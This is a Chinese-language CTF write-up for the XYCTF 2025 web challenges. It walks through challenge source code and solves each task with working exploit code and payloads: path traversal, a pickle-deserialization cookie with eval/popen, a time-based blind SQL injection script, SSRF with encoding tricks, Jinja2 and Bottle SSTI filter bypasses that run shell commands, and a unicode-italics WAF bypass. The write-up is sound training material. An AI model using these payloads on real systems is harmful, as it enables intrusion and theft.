+++
date = '2025-04-10T00:27:55+08:00'
title = 'XYCTF-2025-Web-Writeup'
categories = ["Writeup"]
tags = ["writeup", "ctf", "Web"]

+++



## Web

### **Signin**

题目

```Dockerfile
# -*- encoding: utf-8 -*-
'''
@File    :   main.py
@Time    :   2025/03/28 22:20:49
@Author  :   LamentXU 
'''
'''
flag in /flag_{uuid4}
'''
from bottle import Bottle, request, response, redirect, static_file, run, route
with open('../../secret.txt', 'r') as f:
    secret = f.read()

app = Bottle()
@route('/')
def index():
    return '''HI'''
@route('/download')
def download():
    name = request.query.filename
    if '../../' in name or name.startswith('/') or name.startswith('../') or '\\' in name:
        response.status = 403
        return 'Forbidden'
    with open(name, 'rb') as f:
        data = f.read()
    return data

@route('/secret')
def secret_page():
    try:
        session = request.get_cookie("name", secret=secret)
        if not session or session["name"] == "guest":
            session = {"name": "guest"}
            response.set_cookie("name", session, secret=secret)
            return 'Forbidden!'
        if session["name"] == "admin":
            return 'The secret has been deleted!'
    except:
        return "Error!"
run(host='0.0.0.0', port=8080, debug=False)
```

目录穿越拿secret

```bash
./.././../secret.txt
```

```bash
Hell0_H@cker_Y0u_A3r_Sm@r7
```

看到get\_cookie打pickle反序列化(get_cookie中会进行pickle反序列化)

```python
from bottle import cookie_encode
import os

secret = "Hell0_H@cker_Y0u_A3r_Sm@r7"

class Name:
    def __reduce__(self):
        return (eval, ("""__import__('os').popen('calc').read()""",))

exp = cookie_encode(('session',{"name": [Name()]}),secret)
print(exp)
```

‍

### **ezsql(手动滑稽)**

这题大概fuzz一下可以发现username处waf很多

```python
,
-
=
|
*
&
空格
order by
like
handler
and
union
```

在password处会对单双引号进行转义

那我们只需要想办法构造闭合然后打时间盲注，由于会对单引号进行转义，我这里用的无列名注入

```python
import requests

url = "xxxxx"
result = ""
i = 0

while True:
    i = i + 1
    head = 32
    tail = 127
    while head < tail:
        mid = (head + tail) >> 1
       # 查表名
        # payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
        # 无列名注入
        # payload = "select b from (select 1 as b,2 union select * from user limit 1,1)xrntkk"
        payload = "select b from (select 1 as b union select * from double_check limit 1,1)xrntkk"


        data = {
            'username': "1'or\t1=",
            'password': f'or if(ascii(substr(({payload}),{i},1))>{mid},sleep(1),1)#'
        }
        try:
            r = requests.post(url, data=data, timeout=1)
            print(r.text)
            tail = mid
        except requests.exceptions.Timeout:
            head = mid + 1
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            break

    if head != 32:
        result += chr(head)
    else:
        break
    print("[*]Result : "+result)
```

可以拿到key

```python
[*]Result : dtfrtkcc0czkoua9S
```

![image](../assets/image-20250407001235-klyirfh.png)

在doublecheck.php中输入拿到的key后，会跳转到index.php，可以进行命令执行但是无回显

```python
cat%09/flag.txt>/var/www/html/flag
```

‍

### Fate

源码

```python
#!/usr/bin/env python3
import flask
import sqlite3
import requests
import string
import json
app = flask.Flask(__name__)
blacklist = string.ascii_letters
def binary_to_string(binary_string):
    if len(binary_string) % 8 != 0:
        raise ValueError("Binary string length must be a multiple of 8")
    binary_chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)]
    string_output = ''.join(chr(int(chunk, 2)) for chunk in binary_chunks)
    
    return string_output

@app.route('/proxy', methods=['GET'])
def nolettersproxy():
    url = flask.request.args.get('url')
    if not url:
        return flask.abort(400, 'No URL provided')
    
    target_url = "http://lamentxu.top" + url
    for i in blacklist:
        if i in url:
            return flask.abort(403, 'I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~')
    if "." in url:
        return flask.abort(403, 'No ssrf allowed')
    response = requests.get(target_url)

    return flask.Response(response.content, response.status_code)
def db_search(code):
    with sqlite3.connect('database.db') as conn:
        cur = conn.cursor()
        cur.execute(f"SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER('{code}')))))))")
        found = cur.fetchone()
    return None if found is None else found[0]

@app.route('/')
def index():
    print(flask.request.remote_addr)
    return flask.render_template("index.html")

@app.route('/1337', methods=['GET'])
def api_search():
    if flask.request.remote_addr == '127.0.0.1':
        code = flask.request.args.get('0')
        if code == 'abcdefghi':
            print('0 win!')
            req = flask.request.args.get('1')
            try:
                req = binary_to_string(req)
                print(req)
                req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;)
            except:
                flask.abort(400, "Invalid JSON")
            if 'name' not in req:
                flask.abort(400, "Empty Person's name")

            name = req['name']
            if len(name) > 6:
                flask.abort(400, "Too long")
            if '\'' in name:
                flask.abort(400, "NO '")
            if ')' in name:
                flask.abort(400, "NO )")
            """
            Some waf hidden here ;)
            """

            fate = db_search(name)
            if fate is None:
                flask.abort(404, "No such Person")

            return {'Fate': fate}
        else:
            flask.abort(400, "Hello local, and hello hacker")
    else:
        flask.abort(403, "Only local access allowed")

if __name__ == '__main__':
    app.run(debug=True)

```

审计一下源码，看到init_db里面的fake flag，思路大概就是要在/proxy路由ssrf访问/1337路由去sql读flag

先看proxy，会将传入的url拼接到http://lamentxu.top后面

这里可用@来绕过

接着有两个判断，url中不能存在字母和.

这里用长整型绕过即可

```
/proxy?url=@2130706433:8080/1337
```

接着我们看/1337

```python
code = flask.request.args.get('0')
if code == 'abcdefghi':
    print('0 win!')
```

第一个判断要求传入一串字母，直接传显然过不了/proxy处的判断

我们这里可以二次编码绕过

接着往下看

```python
req = flask.request.args.get('1')
            try:
                req = binary_to_string(req)
                print(req)
                req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;)
            except:
                flask.abort(400, "Invalid JSON")
            if 'name' not in req:
                flask.abort(400, "Empty Person's name")

            name = req['name']
            if len(name) > 6:
                flask.abort(400, "Too long")
            if '\'' in name:
                flask.abort(400, "NO '")
            if ')' in name:
                flask.abort(400, "NO )")
            """
            Some waf hidden here ;)
            """

            fate = db_search(name)
            if fate is None:
                flask.abort(404, "No such Person")

            return {'Fate': fate}
```

这里会将传入的内容通过binary_to_string从二进制转换成字符串，接着会解析为json。接着有一连串waf。

这里我们通过字典绕过，然后构造闭合读flag即可

exp

```python
import requests

#字符串转二进制
def string_to_binary(input_string):
    binary_chunks = [bin(ord(char))[2:].zfill(8) for char in input_string]
    return ''.join(binary_chunks)

url = "xxxxxxx"+"/proxy?url=%40%32%31%33%30%37%30%36%34%33%33%3a%38%30%38%30%2f%31%33%33%37%3f%30%3d%25%36%31%25%36%32%25%36%33%25%36%34%25%36%35%25%36%36%25%36%37%25%36%38%25%36%39%26%31%3d"
payload = string_to_binary("""{"name": {"'))))))) union select FATE from FATETABLE where NAME='LAMENTXU'--":666}}""")
# print(payload)
req = requests.get(url+payload)
data = req.json()
print(data['Fate'])
```

‍

‍

### **Now you see me 1**

从源代码中找出关键代码

```python
# YOU FOUND ME :)
# -*- encoding: utf-8 -*-
'''
@File    :   src.py
@Time    :   2025/03/29 01:10:37
@Author  :   LamentXU 
'''
import flask
import sys

enable_hook = False
counter = 0

def audit_checker(event, args):
    global counter
    if enable_hook:
        if event in ["exec", "compile"]:
            counter += 1
            if counter > 4:
                raise RuntimeError(event)

lock_within = [
    "debug", "form", "args", "values", 
    "headers", "json", "stream", "environ",
    "files", "method", "cookies", "application", 
    'data', 'url' ,'\'', '"', 
    "getattr", "_", "{{", "}}", 
    "[", "]", "\\", "/","self", 
    "lipsum", "cycler", "joiner", "namespace", 
    "init", "dir", "join", "decode", 
    "batch", "first", "last" , 
    " ","dict","list","g.",
    "os", "subprocess",
    "g|a", "GLOBALS", "lower", "upper",
    "BUILTINS", "select", "WHOAMI", "path",
    "os", "popen", "cat", "nl", "app", "setattr", "translate",
    "sort", "base64", "encode", "\\u", "pop", "referer",
    "The closer you see, the lesser you find."] 
        
app = flask.Flask(__name__)

@app.route('/')
def index():
    return 'try /H3dden_route'

@app.route('/H3dden_route')
def r3al_ins1de_th0ught():
    global enable_hook, counter
    name = flask.request.args.get('My_ins1de_w0r1d')
    if name:
        try:
            if name.startswith("Follow-your-heart-"):
                for i in lock_within:
                    if i in name:
                        return 'NOPE.'
                enable_hook = True
                a = flask.render_template_string('{#{name}#}')
                enable_hook = False
                counter = 0
                return a
            else:
                return 'My inside world is always hidden.'
        except RuntimeError as e:
            counter = 0
            return 'NO.'
        except Exception as e:
            return 'Error'
    else:
        return 'Welcome to Hidden_route!'

if __name__ == '__main__':
    import os
    try:
        import _posixsubprocess
        del _posixsubprocess.fork_exec
    except:
        pass
    import subprocess
    del os.popen
    del os.system
    del subprocess.Popen
    del subprocess.call
    del subprocess.run
    del subprocess.check_output
    del subprocess.getoutput
    del subprocess.getstatusoutput
    del subprocess.PIPE
    del subprocess.STDOUT
    del subprocess.CalledProcessError
    del subprocess.TimeoutExpired
    del subprocess.SubprocessError
    sys.addaudithook(audit_checker)
    app.run(debug=False, host='0.0.0.0', port=5000)
```

很明显的 SSTI，我们需要绕过一些过滤，看了一下发现 config 没有被过滤，所以我们可以用它来写入键值。

通过content-type传参来进行绕过waf

Payload：

```python
{{lipsum.__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()")}}
```

```plaintext
GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(lip=a|attr(request.mimetype)))%}{%23 HTTP/1.1
Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080
Content-Type: lipsum
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: close

GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(gl=a.lip|attr(request.mimetype)))%}{%23 HTTP/1.1
Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080
Content-Type: __globals__
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: close

GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(get=request.mimetype))%}{%23 HTTP/1.1
Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080
Content-Type: __getitem__
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: close

GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(bui=request.mimetype))%}{%23 HTTP/1.1
Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080
Content-Type: __builtins__
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: close

GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.update(ev=request.mimetype))%}{%23 HTTP/1.1
Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080
Content-Type: eval
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: close

GET /H3dden_route?My_ins1de_w0r1d=Follow-your-heart-%23}{%set%09a=config%}{%print(a.glb|attr(a.get)(a.bui)|attr(a.get)(a.ev)(request.mimetype))%}{%23 HTTP/1.1
Host: eci-2zealrk72foronxmxgze.cloudeci1.ichunqiu.com:8080
Content-Type: __import__('os').popen('mkdir static;cat /flag_h3r3 > static/flag').read()
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Connection: close
```

访问/static/flag拿到flag

‍

### **Now you see me 2**

这题跟上题打法一样，只是更换了传参的方式

```plaintext
GET /H3dden_route?spell=fly-%23}{%set%09a=config%}{%print(a.update(clss=a|attr(request.range.units)))%}{%23 HTTP/1.1
Host: 127.0.0.1:5000
Range: __class__=100-200
Connection: close
```

拿到一张图片，用[在线解密](https://tools.jb51.net/aideddesign/img_add_info)提取图片隐藏信息，无需密码

```python
flag{__M@g1c1@ans_M@stering_M@g1c__}
```

‍

### 出题人已疯

题目源码

```python
# -*- encoding: utf-8 -*-
'''
@File    :   app.py
@Time    :   2025/03/29 15:52:17
@Author  :   LamentXU 
'''
import bottle
'''
flag in /flag
'''
@bottle.route('/')
def index():
    return 'Hello, World!'
@bottle.route('/attack')
def attack():
    payload = bottle.request.query.get('payload')
    if payload and len(payload) < 25 and 'open' not in payload and '\\' not in payload:
        return bottle.template('hello '+payload)
    else:
        bottle.abort(400, 'Invalid payload')
if __name__ == '__main__':
    bottle.run(host='0.0.0.0', port=5000)
```

用 import 加载模块，然后修改属性去实现变量持久化，从而去 RCE，然后可以用模板函数 include 去读文件

```python
%0a%import+os;os.a='__imp'
%0a%import+os;os.b='ort__'
%0a%import+os;os.a%2B=os.b
%0a%import+os;os.b='("os"'
%0a%import+os;os.a%2B=os.b
%0a%import+os;os.b=').sys'
%0a%import+os;os.a%2B=os.b
%0a%import+os;os.b='tem("'
%0a%import+os;os.a%2B=os.b
%0a%import+os;os.b='ca'
%0a%import+os;os.a%2B=os.b
%0a%import+os;os.b='t+/f*'
%0a%import+os;os.a%2B=os.b
%0a%import+os;os.b='>1")'
%0a%import+os;os.a%2B=os.b
%0a%import+os;exec(os.a)

%0a%import os;eval(os.a)
%0a%include('1')
```

‍

### **ez_puzzle**

#### 非预期

查看puzzle.js，看到有一大段base64

![image](../assets/image-20250407010141-zyhi1kf.png)

cyberchef转换一下

![image](../assets/image-20250407002109-6kytcop.png)

发现是zlib

![image](../assets/image-20250407002221-409o1nm.png)

看到一串hex

反转一下转字符串就能拿到flag

![image](../assets/image-20250407002351-jsv6pho.png)



#### 预期解

![image-20250418143438792](../assets/image-20250418143438792.png)

这题打开控制台会触发反调试

右键从忽略列表中移除即可

![image-20250418143550982](../assets/image-20250418143550982.png)

在代码中可以找到startTime和endTime，猜测应该是endTime-startTime来判断时间，所以直接在控制台给startTime赋一个大值

```
startTime=66666666666666
```

然后把拼图拼好即可拿到flag



### 出题人又疯(复现)

[聊聊bottle框架中由斜体字引发的模板注入（SSTI）waf bypass - LamentXU - 博客园](https://www.cnblogs.com/LAMENTXU/articles/18805019)

![image-20250418141321411](../assets/image-20250418141321411.png)

这题主要是由于bottle框架中对编码检查的不严谨，所以可以利用python中会将exec执行的代码中的斜体字转换为对应的ASCII字符的特性来绕过waf。但是由于url编码问题，题目环境中只有o和a能够成功。

![image-20250418142516624](../assets/image-20250418142516624.png)

详细的得看lamentxu师傅的博客。

 所以这题我们就可以把

```
'o'替换为'%ba',
'a'替换为'%aa',
```

 payload

```
{{open('/flag').read()}}
替换
{\{%bapen('/flag').read()}}  //这里的"\"是防止hugo报错加的，实际不需要
```

![image-20250418142714072](../assets/image-20250418142714072.png)                           

